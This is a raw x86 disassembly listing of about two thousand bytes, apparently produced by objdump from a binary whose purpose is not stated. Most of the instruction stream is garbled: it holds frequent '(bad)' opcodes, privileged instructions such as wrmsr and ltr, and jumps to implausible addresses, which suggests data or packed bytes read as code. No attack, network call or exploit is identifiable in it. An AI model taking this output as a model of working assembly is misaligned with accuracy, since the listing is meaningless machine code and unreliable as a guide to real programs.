  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
